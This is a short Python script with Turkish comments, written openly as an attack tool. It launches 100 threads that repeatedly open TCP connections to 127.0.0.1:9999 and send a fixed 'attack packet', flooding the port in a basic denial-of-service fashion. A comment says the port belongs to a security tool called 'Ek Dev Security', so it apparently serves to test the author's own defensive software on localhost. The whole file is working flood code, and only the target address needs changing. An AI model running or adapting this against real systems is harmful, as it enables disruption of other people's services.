import socket
import threading
import time
import os

# HEDEF AYARLARI
TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999 # Ek Dev Security'nin açtığı port
THREAD_COUNT = 100 # Çoklu saldırı gücü

print(f"SALDIRI BAŞLIYOR -> {TARGET_IP}:{TARGET_PORT}")
time.sleep(2)

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"SALDIRI_PAKETI_X99")
            print(f"[+] Paket Gönderildi!")
            s.close()
        except:
            print("[-] Bağlantı reddedildi (Engellenmiş olabilirsin!)")
            # Engellenince biraz bekle, işlemciyi yakma
            time.sleep(0.5) 

for i in range(THREAD_COUNT):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True: time.sleep(1)